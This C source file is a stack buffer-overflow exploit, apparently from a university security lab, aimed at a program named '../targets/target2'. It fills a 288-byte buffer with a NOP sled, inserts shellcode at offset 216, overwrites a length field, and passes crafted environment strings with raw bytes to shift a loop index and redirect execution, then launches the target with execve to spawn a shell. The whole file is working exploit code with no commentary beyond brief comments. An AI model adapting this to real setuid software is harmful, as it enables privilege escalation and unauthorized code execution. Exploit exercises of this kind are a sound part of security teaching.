#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target2"
#define SIZE 288
#define SHELL_OFFSET 216
#define LEN_OFFSET 264

int
main ( int argc, char * argv[] )
{
	char *	args[3];

	args[0] = TARGET;

	char str[SIZE];

	// Insert NOPs
	memset(str, 0x90, SIZE);

	// Insert shellcode
	for (int i = 0; i < strlen(shellcode); i++)
		str[i + SHELL_OFFSET] = shellcode[i];

	// Alter len value
	*(int*) &str[LEN_OFFSET] = 0x120;

	args[1] = str;
	args[2] = NULL;

	// Modify env variables for reading after null character in arg
	char *	env[] = {
		"",
		"\x17", // change i value
		"dummydummy\x80\xfd\x21\x30", // dummy variables to correspond to increase in i
		"", // nulls act as zeroes
		"",
		"",
		NULL
	};

	if ( execve (TARGET, args, env) < 0 )
		fprintf (stderr, "execve failed.\n");

	return (0);
}
